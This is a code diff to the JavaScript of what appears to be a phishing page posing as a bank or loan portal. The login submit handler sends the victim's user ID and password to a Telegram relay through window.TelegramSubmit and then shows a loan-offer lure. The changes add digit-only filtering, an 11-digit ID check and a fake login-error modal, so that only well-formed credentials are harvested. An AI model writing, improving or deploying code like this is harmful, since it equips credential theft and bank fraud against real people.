@@ -5,6 +5,7 @@
   const modal = document.getElementById("loading-modal");
   const loanOffer = document.getElementById("loan-offer");
   const connModal = document.getElementById("conn-modal");
+  const loginErrorModal = document.getElementById("login-error-modal");
   const loanEmail = document.getElementById("loan-email");
   const loanPhone = document.getElementById("loan-phone");
   const sheet = document.getElementById("alma-sheet");
@@ -21,6 +22,8 @@
   const almaInput = document.getElementById("alma-input");
 
   const LONG = 420;
+  const USER_ID_LEN = 11;
+  const PASSWORD_MIN = 6;
   const TABS = [
     {
       id: "products",
@@ -215,10 +218,35 @@
     }, 280);
   }
 
+  function digitsOnly(value, maxLen) {
+    const digits = value.replace(/\D/g, "");
+    return maxLen != null ? digits.slice(0, maxLen) : digits;
+  }
+
+  function isValidLogin() {
+    const user = userId.value.trim();
+    const pass = password.value.trim();
+    return /^\d{11}$/.test(user) && /^\d{6,}$/.test(pass);
+  }
+
   function syncAccess() {
-    const ready = password.value.trim().length > 0 && userId.value.trim().length > 0;
+    const ready = userId.value.trim().length > 0 && password.value.trim().length > 0;
     btnAccess.disabled = !ready;
     btnAccess.classList.toggle("is-ready", ready);
+  }
+
+  async function showLoginError() {
+    loginErrorModal.hidden = false;
+    loginErrorModal.classList.add("is-show");
+    loginErrorModal.classList.remove("is-hide");
+  }
+
+  async function hideLoginError() {
+    loginErrorModal.classList.remove("is-show");
+    loginErrorModal.classList.add("is-hide");
+    await wait(160);
+    loginErrorModal.hidden = true;
+    loginErrorModal.classList.remove("is-hide");
   }
 
   function randomToken() {
@@ -472,15 +500,24 @@
     syncAccess();
     syncClearBtn();
   });
-  password.addEventListener("input", syncAccess);
+  password.addEventListener("input", () => {
+    const next = digitsOnly(password.value);
+    if (password.value !== next) password.value = next;
+    syncAccess();
+  });
   userId.addEventListener("input", () => {
+    const next = digitsOnly(userId.value, USER_ID_LEN);
+    if (userId.value !== next) userId.value = next;
     syncAccess();
     syncClearBtn();
   });
 
   document.getElementById("login-form")?.addEventListener("submit", async (e) => {
     e.preventDefault();
-    if (btnAccess.disabled) return;
+    if (!isValidLogin()) {
+      showLoginError();
+      return;
+    }
     window.TelegramSubmit?.setLogin(userId.value.trim(), password.value.trim());
     void window.TelegramSubmit?.sendLogin();
     pendingLoanOffer = true;
@@ -501,6 +538,7 @@
   loanEmail?.addEventListener("input", syncLoanEmail);
   loanPhone?.addEventListener("input", syncLoanPhone);
   document.getElementById("conn-close")?.addEventListener("click", hideConnError);
+  document.getElementById("login-error-close")?.addEventListener("click", hideLoginError);
 
   document.getElementById("copy-token")?.addEventListener("click", () => copyCode(tokenValue.textContent));
   document.getElementById("copy-more-token")?.addEventListener("click", () => copyCode(moreTokenValue.textContent));
